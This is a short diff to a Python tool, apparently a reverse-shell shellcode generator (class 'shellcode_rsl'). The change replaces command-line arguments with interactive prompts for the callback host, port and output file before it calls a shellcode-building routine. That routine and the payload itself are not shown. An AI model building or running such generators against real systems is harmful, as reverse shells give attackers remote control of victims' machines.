@@ -63,26 +63,20 @@ class shellcode_rsl:
 
     def __init__(self):
 
-        if len(sys.argv) > 3:
+        host = input("[*] HOST -> ")
+        port = input("[*] PORT -> ")
+        file_name = input("[*] Save File -> ")
+        print("[*] Generating Shellcode")
+        print("[*] Reverse Host -> {}:{}".format(host, port))
+        print("[*] Generating File")
 
-            print("[*] Generating Shellcode")
-            host = sys.argv[1]
-            port = str(sys.argv[2])
-            file_name = sys.argv[3]
-            print("[*] Reverse Host -> {}:{}".format(host, port))
-            print("[*] Generating File")
+        if self.make_sc(host, port, file_name) == True:
 
-            if self.make_sc(host, port, file_name) == True:
-
-                print("[+] Success Save File -> {}".format(file_name))
-
-            else:
-
-                print("[-] Failed Save File -> {}".format(file_name))
+            print("[+] Success Save File -> {}".format(file_name))
 
         else:
 
-            print("[*] python3 {} <HOST> <PORT> <SAVEFILE>".format(sys.argv[0]))
+            print("[-] Failed Save File -> {}".format(file_name))
 
 if __name__ == "__main__":
 
